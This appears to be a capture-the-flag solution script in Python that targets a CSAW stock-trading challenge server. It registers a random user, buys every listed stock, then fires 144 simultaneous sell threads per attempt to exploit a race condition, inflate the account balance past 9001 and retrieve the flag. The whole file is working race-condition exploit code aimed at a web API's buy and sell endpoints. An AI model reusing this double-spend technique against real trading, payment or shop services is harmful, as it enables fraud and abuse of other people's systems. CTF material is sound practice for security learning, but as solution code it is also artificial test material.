import requests
import string
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "http://android-dropper.csaw.io:4657"
ALL_STOCKS = ['AAPLISH','AMAZING','BROOKING','BURPSHARKHAT','CRUISEBOOK','ELONX','FACEFLOP','GOOBER','SNAPSTAR','SPOTLITE','TWEETIFY','ZUCKTECH']
THREADS_PER_STOCK = 12  # 12*12=144 total threads, covers 50-100+
MAX_ATTEMPTS = 25
SELL_SPAM_COUNT = 8  # how many sells per stock per thread per attempt
SLEEP_BUY = 0.10  # Sleep after buys before race sell


def gen_key(length=16):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def register(key):
    r = requests.post(f"{BASE_URL}/login", data={"key": key}, timeout=8)
    return r.json()

def buy_stock(key, stock):
    try:
        r = requests.post(f"{BASE_URL}/buy", data={"key": key, "stock": stock}, timeout=6)
        return r.text.strip()
    except Exception as e:
        return f"BUYERR: {e}"

def sell_stock(key, stock):
    try:
        r = requests.post(f"{BASE_URL}/sell", data={"key": key, "stock": stock}, timeout=3)
        return r.text.strip()
    except Exception as e:
        return f"SELLERR: {e}"

def my_balance(key):
    try:
        r = requests.get(f"{BASE_URL}/balance?key={key}",timeout=8)
        return r.json()['balance']
    except Exception as e:
        print(f"BALANCEERR: {e}"); return None

def try_flag(key):
    try:
        r = requests.post(f"{BASE_URL}/flag", data={"key": key}, timeout=10)
        return r.text.strip()
    except Exception as e:
        return f"FLAGERR: {e}"

def do_race_sell(key):
    # For each stock, race sell (spawn threads all at once)
    def spam_sell(stock):
        for _ in range(SELL_SPAM_COUNT):
            resp = sell_stock(key, stock)
            if 'flag' in resp or 'csawctf' in resp:
                print('\n[RACE FLAG]')
                print(resp)
    threads = []
    for stock in ALL_STOCKS:
        for _ in range(THREADS_PER_STOCK):
            t = threading.Thread(target=spam_sell, args=(stock,))
            threads.append(t)
    for t in threads: t.start()
    for t in threads: t.join()

def main():
    key = gen_key()
    print(f"[*] Registering user: {key}")
    reginfo = register(key)
    if 'balance' in reginfo:
        print(f"[*] Initial balance: {reginfo['balance']}")
    else:
        print("[!] Register failed", reginfo); return
    # Buy ALL stocks
    for stock in ALL_STOCKS:
        resp = buy_stock(key, stock)
        print(f"[BUY {stock}] {resp}")
    time.sleep(SLEEP_BUY)
    for attempt in range(1, MAX_ATTEMPTS+1):
        print(f"\n[Race attempt {attempt}]")
        do_race_sell(key)
        bal = my_balance(key)
        if bal is not None:
            print(f"[After race {attempt}] balance: {bal}")
            if bal >= 9001:
                print(f"[*] High balance {bal}! Trying flag...")
                flag = try_flag(key)
                print(flag)
                if 'csawctf' in flag: return  # Got flag, done!
        else:
            print("[x] Could not get balance, retry...")
        # Rebuy stocks for next race (ensure holdings)
        for stock in ALL_STOCKS:
            buy_stock(key, stock)
        time.sleep(SLEEP_BUY)
    print("[!] Race did not succeed, higher thread tuning or exploit refinement may be needed.")

if __name__=="__main__":
    main()

